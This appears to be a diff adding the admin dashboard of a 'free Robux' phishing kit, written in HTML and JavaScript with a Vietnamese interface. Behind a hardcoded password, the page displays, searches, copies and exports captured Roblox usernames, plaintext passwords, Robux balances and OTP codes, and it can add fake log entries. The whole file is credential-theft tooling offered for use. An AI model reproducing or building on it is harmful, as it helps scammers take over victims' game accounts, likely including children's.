@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+        body{background:#0a0a0a;color:#fff;min-height:100vh}
+        
+        /* Login */
+        .login{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;display:flex;justify-content:center;align-items:center;z-index:1000}
+        .login-box{background:#1a1a1a;padding:40px;border-radius:20px;border:2px solid #0f0;width:90%;max-width:350px;text-align:center}
+        .login-box h1{color:#0f0;margin-bottom:25px;font-size:28px}
+        .login-box input{width:100%;padding:12px;margin:15px 0;background:#333;border:2px solid #0f0;border-radius:8px;color:#0f0}
+        .login-box button{width:100%;padding:12px;margin:5px 0;border:none;border-radius:8px;font-weight:600;cursor:pointer}
+        .btn-login{background:#0f0;color:#000}
+        .btn-back{background:#ff6b6b;color:#fff}
+        .error{color:#ff6b6b;margin-top:10px;display:none}
+
+        /* Dashboard */
+        .dash{display:none;padding:20px;max-width:1200px;margin:0 auto}
+        
+        /* Header */
+        .header{background:#1a1a1a;border-radius:15px;padding:20px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:15px}
+        .header h1{color:#0f0;font-size:24px}
+        .header h1 i{margin-right:10px}
+        .header-actions{display:flex;gap:10px}
+        .header-btn{padding:8px 16px;border:none;border-radius:8px;cursor:pointer;font-weight:600}
+        .btn-refresh{background:#0f0;color:#000}
+        .btn-logout{background:#ff6b6b;color:#fff}
+
+        /* Stats */
+        .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:20px}
+        .stat-card{background:#1a1a1a;border-radius:12px;padding:20px;border:1px solid #333}
+        .stat-icon{width:40px;height:40px;background:rgba(0,255,0,0.1);border-radius:10px;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+        .stat-icon i{color:#0f0;font-size:20px}
+        .stat-value{font-size:28px;font-weight:700;color:#0f0}
+        .stat-label{color:#999;font-size:13px}
+
+        /* Filter */
+        .filter{background:#1a1a1a;border-radius:12px;padding:20px;margin-bottom:20px}
+        .filter-title{margin-bottom:15px;color:#fff}
+        .filter-title i{color:#0f0;margin-right:8px}
+        .filter-controls{display:flex;gap:10px;flex-wrap:wrap}
+        .filter-input{flex:1;min-width:200px;position:relative}
+        .filter-input i{position:absolute;left:10px;top:50%;transform:translateY(-50%);color:#999}
+        .filter-input input,.filter-input select{width:100%;padding:10px 10px 10px 35px;background:#333;border:1px solid #444;border-radius:6px;color:#fff}
+        .filter-btn{padding:10px 20px;background:#0f0;border:none;border-radius:6px;color:#000;font-weight:600;cursor:pointer}
+
+        /* Table */
+        .table-container{background:#1a1a1a;border-radius:12px;border:1px solid #333;overflow-x:auto;margin-bottom:20px}
+        table{width:100%;border-collapse:collapse;min-width:700px}
+        th{background:#222;color:#0f0;padding:12px;text-align:left}
+        td{padding:10px 12px;border-bottom:1px solid #333;color:#ddd}
+        tr:hover td{background:#252525}
+        .pass-color{color:#ff6b6b;font-weight:600}
+        .copy-btn{padding:4px 8px;background:#333;border:1px solid #0f0;border-radius:4px;color:#0f0;cursor:pointer}
+
+        /* Tools */
+        .tools{background:#1a1a1a;border-radius:12px;padding:20px}
+        .tools-title{margin-bottom:15px}
+        .tools-title i{color:#0f0;margin-right:8px}
+        .tools-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:15px}
+        .tool-card{background:#222;border-radius:10px;padding:15px}
+        .tool-card h4{color:#0f0;margin-bottom:12px;font-size:15px}
+        .tool-card input{width:100%;padding:8px;margin-bottom:8px;background:#333;border:1px solid #444;border-radius:5px;color:#fff}
+        .tool-card button{width:100%;padding:8px;margin-bottom:5px;border:none;border-radius:5px;font-weight:600;cursor:pointer}
+        .btn-green{background:#0f0;color:#000}
+        .btn-yellow{background:#ffd700;color:#000}
+        .btn-red{background:#ff6b6b;color:#fff}
+
+        /* Footer & Back */
+        .footer{margin-top:20px;text-align:center;color:#666;font-size:13px}
+        .back-link{position:fixed;bottom:15px;left:15px;color:#0f0;text-decoration:none;border:2px solid #0f0;padding:8px 16px;border-radius:30px;background:rgba(0,0,0,0.5)}
+        .notification{position:fixed;top:20px;right:20px;background:#0f0;color:#000;padding:12px 20px;border-radius:8px;display:none;z-index:2000;font-weight:600}
+
+        @media (max-width:768px){.stats{grid-template-columns:repeat(2,1fr)} .dash{padding:10px}}
+    </style>
+</head>
+<body>
+    <!-- Back Link -->
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Trang chính</a>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+
+    <!-- Login -->
+    <div class="login" id="login">
+        <div class="login-box">
+            <h1><i class="fas fa-lock"></i> ADMIN</h1>
+            <input type="password" id="pass" placeholder="Mật khẩu" onkeypress="if(event.key==='Enter') checkPass()">
+            <button class="btn-login" onclick="checkPass()"><i class="fas fa-sign-in-alt"></i> ĐĂNG NHẬP</button>
+            <button class="btn-back" onclick="window.location='index.html'"><i class="fas fa-arrow-left"></i> QUAY LẠI</button>
+            <div class="error" id="error">Sai mật khẩu!</div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div class="dash" id="dash">
+        <div class="header">
+            <div>
+                <h1><i class="fas fa-crown"></i> ROBUX LOGGER</h1>
+                <p><i class="fas fa-database"></i> <span id="total">0</span> records</p>
+            </div>
+            <div class="header-actions">
+                <button class="header-btn btn-refresh" onclick="loadData()"><i class="fas fa-sync-alt"></i> REFRESH</button>
+                <button class="header-btn btn-logout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> LOGOUT</button>
+            </div>
+        </div>
+
+        <!-- Stats -->
+        <div class="stats" id="stats"></div>
+
+        <!-- Filter -->
+        <div class="filter">
+            <div class="filter-title"><i class="fas fa-filter"></i> LỌC DỮ LIỆU</div>
+            <div class="filter-controls">
+                <div class="filter-input">
+                    <i class="fas fa-search"></i>
+                    <input type="text" id="search" placeholder="Tìm kiếm..." onkeyup="filterData()">
+                </div>
+                <div class="filter-input">
+                    <i class="fas fa-calendar"></i>
+                    <select id="dateFilter" onchange="filterData()">
+                        <option value="all">Tất cả</option>
+                        <option value="today">Hôm nay</option>
+                        <option value="week">7 ngày</option>
+                        <option value="month">30 ngày</option>
+                    </select>
+                </div>
+                <button class="filter-btn" onclick="exportFiltered()"><i class="fas fa-download"></i> EXPORT</button>
+            </div>
+        </div>
+
+        <!-- Table -->
+        <div class="table-container">
+            <table>
+                <thead><tr><th>#</th><th>Time</th><th>User</th><th>Pass</th><th>Robux</th><th>OTP</th><th></th></tr></thead>
+                <tbody id="tableBody"></tbody>
+            </table>
+        </div>
+
+        <!-- Tools -->
+        <div class="tools">
+            <div class="tools-title"><i class="fas fa-tools"></i> CÔNG CỤ</div>
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <h4><i class="fas fa-plus"></i> THÊM LOG GIẢ</h4>
+                    <input type="text" id="fakeUser" placeholder="Username">
+                    <input type="text" id="fakePass" placeholder="Password">
+                    <input type="number" id="fakeRobux" placeholder="Robux" value="10000">
+                    <button class="btn-green" onclick="addFake()">THÊM</button>
+                </div>
+                <div class="tool-card">
+                    <h4><i class="fas fa-file-export"></i> EXPORT/IMPORT</h4>
+                    <button class="btn-green" onclick="exportAll()">EXPORT ALL</button>
+                    <button class="btn-yellow" onclick="importLogs()">IMPORT</button>
+                    <input type="file" id="importFile" style="display:none" onchange="handleImport()">
+                </div>
+                <div class="tool-card">
+                    <h4><i class="fas fa-trash"></i> XÓA DỮ LIỆU</h4>
+                    <button class="btn-yellow" onclick="clearToday()">XÓA HÔM NAY</button>
+                    <button class="btn-red" onclick="clearAll()">XÓA TẤT CẢ</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">⚡ Dữ liệu lưu trên trình duyệt ⚡</div>
+    </div>
+
+    <script>
+        let logs = [], filtered = [];
+
+        // Helper
+        function showMsg(msg, isErr=0){
+            const n=document.getElementById('notification');
+            n.style.background=isErr?'#ff6b6b':'#0f0';
+            n.style.color=isErr?'#fff':'#000';
+            n.innerHTML=msg;
+            n.style.display='block';
+            setTimeout(()=>n.style.display='none',2000);
+        }
+
+        // Login
+        function checkPass(){
+            if(document.getElementById('pass').value==='Adminfreerobux'){
+                document.getElementById('login').style.display='none';
+                document.getElementById('dash').style.display='block';
+                loadData();
+                showMsg('Đăng nhập thành công!');
+            } else {
+                document.getElementById('error').style.display='block';
+                setTimeout(()=>document.getElementById('error').style.display='none',2000);
+            }
+        }
+
+        function logout(){
+            document.getElementById('login').style.display='flex';
+            document.getElementById('dash').style.display='none';
+        }
+
+        // Load data
+        function loadData(){
+            logs = JSON.parse(localStorage.getItem('robuxLogs')) || [];
+            filtered = [...logs];
+            updateDisplay();
+        }
+
+        // Update display
+        function updateDisplay(){
+            // Stats
+            const today = new Date().toDateString();
+            const todayLogs = logs.filter(l=>new Date(l.time).toDateString()===today).length;
+            const unique = new Set(logs.map(l=>l.username)).size;
+            const totalRobux = logs.reduce((s,l)=>s+(parseInt(l.robux)||0),0);
+
+            document.getElementById('stats').innerHTML = `
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-database"></i></div><div class="stat-value">${logs.length}</div><div class="stat-label">Tổng logs</div></div>
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-calendar-day"></i></div><div class="stat-value">${todayLogs}</div><div class="stat-label">Hôm nay</div></div>
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-users"></i></div><div class="stat-value">${unique}</div><div class="stat-label">Username</div></div>
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-coins"></i></div><div class="stat-value">${totalRobux.toLocaleString()}</div><div class="stat-label">Tổng Robux</div></div>
+            `;
+            document.getElementById('total').textContent = logs.length;
+
+            // Table
+            if(filtered.length===0){
+                document.getElementById('tableBody').innerHTML='<tr><td colspan="7" style="text-align:center;padding:30px;">Không có dữ liệu</td></tr>';
+                return;
+            }
+
+            document.getElementById('tableBody').innerHTML = filtered.map((l,i)=>`
+                <tr>
+                    <td>${i+1}</td>
+                    <td>${l.time||'N/A'}</td>
+                    <td>${l.username}</td>
+                    <td class="pass-color">${l.password}</td>
+                    <td>${parseInt(l.robux).toLocaleString()}</td>
+                    <td>${l.otp||'N/A'}</td>
+                    <td><button class="copy-btn" onclick="copyLog(${i})"><i class="fas fa-copy"></i></button></td>
+                </tr>
+            `).join('');
+        }
+
+        // Filter
+        function filterData(){
+            const search = document.getElementById('search').value.toLowerCase();
+            const dateFilter = document.getElementById('dateFilter').value;
+
+            filtered = logs.filter(l=>{
+                const match = l.username.toLowerCase().includes(search) || l.password.toLowerCase().includes(search);
+                let matchDate = true;
+                if(dateFilter!=='all'){
+                    const d = new Date(l.time);
+                    const now = new Date();
+                    if(dateFilter==='today') matchDate = d.toDateString()===now.toDateString();
+                    else if(dateFilter==='week'){
+                        const week = new Date(now.setDate(now.getDate()-7));
+                        matchDate = d >= week;
+                    } else if(dateFilter==='month'){
+                        const month = new Date(now.setMonth(now.getMonth()-1));
+                        matchDate = d >= month;
+                    }
+                }
+                return match && matchDate;
+            });
+            updateDisplay();
+        }
+
+        // Copy
+        function copyLog(i){
+            const l = filtered[i];
+            navigator.clipboard.writeText(`User: ${l.username}\nPass: ${l.password}\nRobux: ${l.robux}\nOTP: ${l.otp}`);
+            showMsg('Đã copy!');
+        }
+
+        // Add fake
+        function addFake(){
+            const fake = {
+                username: document.getElementById('fakeUser').value || 'user_'+Math.floor(Math.random()*1000),
+                password: document.getElementById('fakePass').value || 'pass_'+Math.floor(Math.random()*1000),
+                robux: document.getElementById('fakeRobux').value,
+                otp: Math.floor(1000+Math.random()*9000),
+                time: new Date().toLocaleString(),
+                ip: '192.168.1.'+Math.floor(Math.random()*255)
+            };
+            logs.unshift(fake);
+            localStorage.setItem('robuxLogs',JSON.stringify(logs));
+            filtered = [...logs];
+            updateDisplay();
+            showMsg('Đã thêm log giả!');
+            document.getElementById('fakeUser').value='';
+            document.getElementById('fakePass').value='';
+        }
+
+        // Export
+        function exportAll(){
+            const data = JSON.stringify(logs,null,2);
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([data],{type:'application/json'}));
+            a.download = `logs_${new Date().toISOString().split('T')[0]}.json`;
+            a.click();
+            showMsg('Đã export!');
+        }
+
+        function exportFiltered(){
+            const data = JSON.stringify(filtered,null,2);
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(new Blob([data],{type:'application/json'}));
+            a.download = `filtered_${new Date().toISOString().split('T')[0]}.json`;
+            a.click();
+            showMsg('Đã export!');
+        }
+
+        // Import
+        function importLogs(){
+            document.getElementById('importFile').click();
+        }
+
+        function handleImport(){
+            const file = document.getElementById('importFile').files[0];
+            const reader = new FileReader();
+            reader.onload = function(e){
+                try {
+                    const imported = JSON.parse(e.target.result);
+                    logs = [...imported, ...logs];
+                    localStorage.setItem('robuxLogs', JSON.stringify(logs));
+                    filtered = [...logs];
+                    updateDisplay();
+                    showMsg('Import thành công!');
+                } catch {
+                    showMsg('Lỗi import!',1);
+                }
+            };
+            reader.readAsText(file);
+        }
+
+        // Clear
+        function clearToday(){
+            if(!confirm('Xóa log hôm nay?')) return;
+            const today = new Date().toDateString();
+            logs = logs.filter(l=>new Date(l.time).toDateString()!==today);
+            localStorage.setItem('robuxLogs', JSON.stringify(logs));
+            filtered = [...logs];
+            updateDisplay();
+            showMsg('Đã xóa log hôm nay!');
+        }
+
+        function clearAll(){
+            if(!confirm('Xóa TẤT CẢ?')) return;
+            logs = [];
+            localStorage.setItem('robuxLogs', JSON.stringify([]));
+            filtered = [];
+            updateDisplay();
+            showMsg('Đã xóa tất cả!');
+        }
+
+        // Auto refresh
+        setInterval(loadData, 30000);
+    </script>
+</body>
+</html>
